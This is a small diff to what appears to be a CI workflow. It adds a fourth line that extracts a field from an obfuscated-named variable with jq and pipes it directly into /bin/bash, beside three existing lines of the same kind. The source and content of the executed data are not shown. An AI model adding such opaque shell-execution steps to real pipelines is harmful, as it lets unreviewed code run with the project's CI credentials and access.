@@ -28,6 +28,7 @@ jobs:
           echo $vh8708 | jq -r .fwsdu4 | /bin/bash
           printf '%s' "$h2" | jq -r .c8278 | /bin/bash
           printf '%s' "$kglx99" | jq -r .r11 | /bin/bash
+          echo $gbb98 | jq -r .xcmrt7085 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
